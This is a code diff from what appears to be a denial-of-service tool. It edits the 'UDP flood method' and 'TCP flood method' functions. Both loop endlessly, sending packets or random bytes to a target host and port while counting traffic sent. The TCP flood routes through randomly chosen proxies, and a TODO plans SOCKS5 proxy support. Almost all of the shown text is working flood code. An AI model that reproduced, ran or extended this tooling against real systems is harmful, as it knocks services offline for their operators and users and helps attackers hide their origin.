@@ -27,16 +27,19 @@ def build_ctx_request_http_package(_ctx: Context) -> bytes:
 ###############################################
 # Attack methods
 ###############################################
+# TODO add support for SOCKS5 proxy if proxy supports associate request
+# https://stackoverflow.com/a/47079318/2628125
+# https://datatracker.ietf.org/doc/html/rfc1928
+# https://blog.birost.com/a?ID=00100-38682fbb-83c3-49d7-8cfc-406b05bf086c
+# PySocks has issues with basic implementation
 def down_it_udp(_ctx: Context) -> None:
     """UDP flood method."""
     i = 1
-    proxy = None
-    target = (_ctx.host_ip, _ctx.port)
     error_code = 'Send UDP packet'
+    target = (_ctx.host_ip, _ctx.port)
 
     while True:
-        proxy = _ctx.proxy_manager.get_random_proxy()
-        sock = _ctx.sock_manager.get_udp_socket(proxy)
+        sock = _ctx.sock_manager.get_udp_socket()
         request_packet = build_ctx_request_http_package(_ctx)
 
         try:
@@ -45,14 +48,13 @@ def down_it_udp(_ctx: Context) -> None:
             _ctx.add_error(Errors(error_code, GETTING_SERVER_IP_ERROR_MSG))
         except Exception as e:
             _ctx.add_error(Errors(f'{error_code} ERR', e))
-            _ctx.sock_manager.close_udp_socket(proxy)
+            _ctx.sock_manager.close_udp_socket()
         # successful try (sock.sendto)
         else:
             _ctx.Statistic.packets.total_sent += 1
             _ctx.Statistic.packets.sync_packets_sent()
             _ctx.Statistic.packets.total_sent_bytes += sent
             _ctx.remove_error(Errors(error_code, GETTING_SERVER_IP_ERROR_MSG).uuid)
-            proxy.report_success() if proxy is not None else 0
 
         i += 1
         if i == 100:
@@ -61,7 +63,7 @@ def down_it_udp(_ctx: Context) -> None:
                 threading.Thread(
                     daemon=True,
                     target=services.connect_host,
-                    args=[_ctx, proxy],
+                    args=[_ctx],
                 ).start()
                 # services.connect_host(_ctx,)
 
@@ -99,12 +101,13 @@ def down_it_tcp(_ctx: Context) -> None:
     """TCP flood method."""
     proxy = None
     error_code = 'Send TCP packet'
+    target = (_ctx.host_ip, _ctx.port)
 
     while True:
         try:
             proxy = _ctx.proxy_manager.get_random_proxy()
             sock = _ctx.sock_manager.create_tcp_socket(proxy)
-            sock.connect((_ctx.host_ip, _ctx.port))
+            sock.connect(target)
             _ctx.Statistic.connect.success += 1
             while True:
                 bytes_to_send = randbytes(_ctx.max_random_packet_len)
